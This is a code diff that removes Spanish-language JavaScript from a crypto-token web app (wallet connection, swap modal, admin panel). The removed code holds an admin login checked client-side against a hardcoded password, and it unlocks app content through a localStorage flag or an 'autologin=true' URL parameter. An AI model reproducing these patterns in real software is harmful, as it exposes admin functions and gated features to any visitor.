-          document.getElementById('appContent').style.display = 'block';
-          
-          document.getElementById('helpBtn').style.display = 'inline-block';
-          document.getElementById('btnLogoutTop').style.display = 'inline-block'; 
-          document.getElementById('authBtn').style.display = 'none';
-          
-          document.getElementById('userDisplay').innerText = user.email || user.displayName || "Usuario NEX";
-
-          escucharChatUsuario(user.uid);
-
-          if (typeof window.ethereum !== 'undefined') {
-            try {
-              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-              if (accounts && accounts.length > 0) {
-                window.consultarSaldoOnChain(accounts[0]);
-              }
-            } catch (e) {}
-          }
-        } else {
-          if (typeof window.ethereum !== 'undefined' || localStorage.getItem("nex_sesion_activa") === "true" || window.location.search.includes("autologin=true")) {
-            document.getElementById('welcomeSection').style.display = 'none';
-            document.getElementById('appContent').style.display = 'block';
-            
-            document.getElementById('btnLogoutTop').style.display = 'inline-block';
-            document.getElementById('authBtn').style.display = 'none';
-            
-            if (typeof window.ethereum !== 'undefined') {
-              try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                if (accounts && accounts.length > 0) {
-                  window.consultarSaldoOnChain(accounts[0]);
-                }
-              } catch(e) {}
-            }
-            return;
-          }
-          window.usuarioActual = null;
-          document.getElementById('appContent').style.display = 'none';
-          document.getElementById('welcomeSection').style.display = 'block';
-          
-          document.getElementById('helpBtn').style.display = 'none';
-          document.getElementById('btnLogoutTop').style.display = 'none'; 
-          document.getElementById('authBtn').style.display = 'inline-block';
-        }
-      });
-
-      window.onload = async () => {
-          if (localStorage.getItem("nex_sesion_activa") === "true" || window.location.search.includes("autologin=true") || typeof window.ethereum !== 'undefined') {
-              document.getElementById('welcomeSection').style.display = 'none';
-              document.getElementById('appContent').style.display = 'block';
-              
-              document.getElementById('btnLogoutTop').style.display = 'inline-block';
-              document.getElementById('authBtn').style.display = 'none';
-          } else {
-              document.getElementById('appContent').style.display = 'none';
-              document.getElementById('welcomeSection').style.display = 'block';
-              
-              document.getElementById('btnLogoutTop').style.display = 'none';
-              document.getElementById('authBtn').style.display = 'inline-block';
-          }
-          await window.asegurarRedBNB();
-          await window.actualizarPrecioTokenEnVivo();
-          setInterval(window.actualizarPrecioTokenEnVivo, 12000);
-
-          if (typeof window.ethereum !== 'undefined') {
-              try {
-                  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                  if (accounts.length > 0) {
-                      window.consultarSaldoOnChain(accounts[0]);
-                  }
-              } catch(e) {}
-          }
-      };
-
-      const docRefConfig = doc(db, "configuracion", "general");
-      onSnapshot(docRefConfig, (snap) => {
-        if (snap.exists()) {
-          const d = snap.data();
-          if(d.colorBotones) document.documentElement.style.setProperty('--primary-cyan', d.colorBotones);
-          document.getElementById('realTradeSection').style.display = d.tradingHabilitado !== "no" ? 'block' : 'none';
-        }
-      });
-
-      window.toggleHistorial = function() { 
-        const div = document.getElementById('historialLista'); 
-        div.style.display = div.style.display === 'none' ? 'block' : 'none'; 
-      };
-    </script>
-
-    <script>
-      window.abrirAuthModal = function() { document.getElementById('authModal').classList.add('show'); };
-      window.cerrarAuthModal = function() { document.getElementById('authModal').classList.remove('show'); };
-      window.abrirHelpModal = function() { document.getElementById('helpModal').classList.add('show'); };
-      window.cerrarHelpModal = function() { document.getElementById('helpModal').classList.remove('show'); };
-      
-      window.abrirLoginAdminModal = function() { document.getElementById('adminAuthModal').classList.add('show'); };
-      window.cerrarAdminModal = function() { document.getElementById('adminModal').classList.remove('show'); };
-      window.cerrarModal = function(id) { document.getElementById(id).classList.remove('show'); };
-
-      window.abrirModalCanjear = function() {
-          if (typeof window.ethereum === 'undefined' || !window.walletDireccionConectada) {
-              return alert("Por favor, conecta tu billetera primero para poder canjear.");
-          }
-          document.getElementById('swapAmountIn').value = '';
-          document.getElementById('swapExpectedOut').innerText = 'Recibirás aprox: 0.00 NEX';
-          document.getElementById('modalCanjear').classList.add('show');
-          
-          window.actualizarSaldosSwap();
-      };
-
-      window.validarCredencialesAdmin = function() {
-        const u = document.getElementById('adminUserInput').value;
-        const p = document.getElementById('adminPassInput').value;
-        if(u === "admin" && p === "200832") {
-            cerrarModal('adminAuthModal');
-            document.getElementById('adminModal').classList.add('show');
-            document.getElementById('adminUserInput').value = '';
-            document.getElementById('adminPassInput').value = '';
-        } else {
-            alert("Credenciales incorrectas");
-        }
-      };
-
-      window.cambiarPestañaAdmin = function(tabId, btn) {
-        const contents = document.querySelectorAll('.tab-content');
-        contents.forEach(c => c.classList.remove('active'));
-        const buttons = document.querySelectorAll('.tab-btn');
-        buttons.forEach(b => b.classList.remove('active'));
-        
-        document.getElementById(tabId).classList.add('active');
-        btn.classList.add('active');
-      };
-
-      window.abrirWalletChoiceModal = function() { document.getElementById('walletChoiceModal').classList.add('show'); };
-      window.abrirModalEnviarTokens = function() { document.getElementById('sendTokensModal').classList.add('show'); };
-
-      window.vincularTokenWeb3 = async function(walletType) {
-        cerrarModal('walletChoiceModal');
-        
-        if (typeof window.ethereum !== 'undefined') {
-          try {
-            if (window.asegurarRedBNB) await window.asegurarRedBNB();
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            if (accounts && accounts.length > 0) {
-              window.consultarSaldoOnChain(accounts[0]);
-              return;
-            }
-          } catch (error) {
-            alert("Debes autorizar la conexión con tu billetera.");
-          }
-        } else {
-          localStorage.setItem("nex_sesion_activa", "true");
-          const baseUrl = window.location.origin + window.location.pathname;
-          const targetUrl = `${baseUrl}?autologin=true`;
-          
-          if (walletType === 'metamask') {
-            window.location.href = `https://metamask.app.link/dapp/${targetUrl.replace(/^https?:\/\//, '')}`;
-          } else if (walletType === 'trustwallet') {
-            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
-          }
-        }
-      };
-    </script>
+  $('#k-target').addEventListener('keydown', e => { if (e.key === 'Enter') klvRecon(); });
+})();
+</script>
 </body>
 </html>
